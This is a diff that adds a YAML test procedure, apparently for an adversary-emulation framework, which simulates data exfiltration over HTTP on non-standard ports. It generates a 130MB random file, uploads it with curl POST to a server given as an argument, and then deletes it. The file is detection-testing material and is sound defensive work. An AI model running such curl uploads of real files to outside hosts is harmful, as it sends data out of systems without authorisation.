@@ -1,0 +1,33 @@
+---
+api_version: 2.0
+uuid: d4a1acfa-3e2e-4118-87c1-5d1d1fb98c25
+name: http_exfil_non_std_port
+authors:
+  - cedowens
+description: |
+  "This TTP uses curl to send data out over http using non-standard ports. This TTP generates a random 130MB sized file for exfiltration which is over the 100MB threshold."
+args:
+  - name: web_server
+    description: The url to exfil the 130MB sized test file to.
+requirements:
+  platforms:
+    - os: linux
+mitre:
+  tactics:
+    - TA0010 Exfiltration
+  techniques:
+    - T1041 Exfiltration over C2 Channel
+steps:
+  - name: generate_random_file
+    inline: |
+      echo "First, generating a random 130MB sized file..."
+      openssl rand -base64 100000000 > testfile.txt
+  - name: exfil_over_curl
+    inline: |
+      echo "Next, using curl to send the file to the specified server: {{ .Args.web_server }}..."
+      curl -X POST --data-binary @testfile.txt {{ .Args.web_server }}
+    cleanup:
+      inline: |
+        echo "Removing the random 130 MB testfile.txt file..."
+        rm testfile.txt
+        echo "Cleanup done!"
